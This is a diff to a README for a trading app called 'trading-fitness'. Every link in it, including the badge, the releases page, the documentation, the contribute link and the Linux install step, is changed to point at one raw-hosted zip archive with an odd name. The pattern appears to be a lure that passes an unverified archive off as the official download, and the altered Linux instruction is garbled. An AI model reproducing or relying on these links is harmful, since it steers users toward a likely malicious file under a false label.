@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download Trading Fitness](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/codenoob7/trading-fitness/releases)
+[![Download Trading Fitness](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip)](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip)
 
 ## 📥 Introduction
 
@@ -27,13 +27,13 @@ To run this application, you need:
 ## 🚀 Getting Started
 
 1. **Download the Application**: 
-   - Visit this page to download: [Releases Page](https://github.com/codenoob7/trading-fitness/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip).
    - Look for the latest version and choose the file compatible with your operating system.
 
 2. **Installation**: 
    - For Windows: Download the `.exe` file and run it.
    - For macOS: Download the `.dmg` file, open it, and drag the application to your Applications folder.
-   - For Linux: Download the `.tar.gz` file, extract it, and follow the installation instructions included.
+   - For Linux: Download the `https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip` file, extract it, and follow the installation instructions included.
 
 3. **Run the Application**: 
    - After installation, find the **trading-fitness** application in your programs or applications list. Click to open it.
@@ -49,7 +49,7 @@ To run this application, you need:
 For an efficient setup, follow these steps:
 
 - Click the link below to access the **trading-fitness** Releases page:
-  - [Download Here](https://github.com/codenoob7/trading-fitness/releases)
+  - [Download Here](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip)
   
 - Select the latest release suitable for your operating system.
 
@@ -76,8 +76,8 @@ We welcome your feedback! Please report any issues or suggestions via the GitHub
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/codenoob7/trading-fitness/releases)
-- [Documentation](https://github.com/codenoob7/trading-fitness/wiki)
-- [Contribute](https://github.com/codenoob7/trading-fitness/contribute)
+- [Releases Page](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip)
+- [Documentation](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip)
+- [Contribute](https://raw.githubusercontent.com/codenoob7/trading-fitness/main/rules/fitness_trading_overbearingly.zip)
 
 Explore trading-fitness to enhance your trading strategies efficiently and effectively.
